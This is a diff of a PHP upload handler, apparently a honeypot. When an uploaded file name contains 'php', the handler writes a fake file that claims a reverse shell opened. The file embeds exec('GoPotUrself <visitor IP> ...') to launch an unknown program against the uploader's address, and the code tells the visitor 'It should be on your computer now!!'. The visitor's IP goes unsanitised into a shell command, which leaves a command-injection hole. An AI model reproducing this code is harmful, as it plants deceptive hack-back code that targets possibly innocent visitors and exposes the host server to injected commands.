@@ -31,21 +31,18 @@
 	$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
 	$uploadOK = 1;
 
-	#exec("GoPotUrself $ip &");
-
 	// Try to upload file
 	if(isset($_POST["submit"])) {
 		$file_name = $_FILES['fileToUpload']['name'];
-		echo "<h2> $file_name </h2>";
 		if(strpos($file_name, 'php') !== false){
-			echo "<h2> YES </h2>";
 			$ip = getUserIpAddr();
             $new_file = fopen("images/" .$file_name, "w");
-			$content = '<!DOCTYPE html>\n<html>\n  <body>\n    WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to given IP and Port\n';
-			$content = $content . '    <?php exec(GoPotUrself '. $ip .' &); ?>\n';
-			$content = $content . '  </body>\n</html>';
+			$content = '<!DOCTYPE html><html><body> WARNING: Failed to daemonise. This is quite common and not fatal. Successfully opened reverse shell to given IP and Port ';
+			$content = $content . "<?php exec(\"GoPotUrself $ip > /dev/null &\"); ?>";
+			$content = $content . '</body></html>';
             fwrite($new_file, $content);
-            fclose($new_file);	
+			fclose($new_file);	
+			echo "It should be on your computer now!!";
 			$uploadOk = 0;
 		}
 		else {
